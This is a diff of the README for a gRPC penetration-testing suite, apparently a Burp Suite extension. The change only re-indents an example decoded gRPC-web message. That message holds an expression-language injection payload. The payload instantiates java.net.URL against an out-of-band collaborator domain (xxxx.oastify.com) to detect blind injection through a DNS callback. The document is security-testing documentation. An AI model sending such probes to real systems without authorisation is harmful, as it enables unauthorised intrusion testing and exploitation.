@@ -14,16 +14,16 @@ New Features:
 2. Scanner Insertion Points (now if you right-click on an application/grpc-web-text HTTP request / host -> Scan -> Active Scan, Burp will manage to recognize the format, decode it, insert payloads in any field, and encode it back.)
 
 
-    1: {
-      9: 0
-      10: 0
-      19: {"test"}
-      25: {
-        "#{\"\".getClass().forName(\"java.net.URL\").getConstructors()[2].newInstance(\"http:/"
-      "/xxxx.oastify.com.\").hashCode()}"
-      }
-    }
-    10: {2: 20}
+        1: {
+          9: 0
+          10: 0
+          19: {"test"}
+          25: {
+            "#{\"\".getClass().forName(\"java.net.URL\").getConstructors()[2].newInstance(\"http:/"
+          "/xxxx.oastify.com.\").hashCode()}"
+          }
+        }
+        10: {2: 20}
 
 
 gRPC-Pentest-Suite contains these 2 tools:
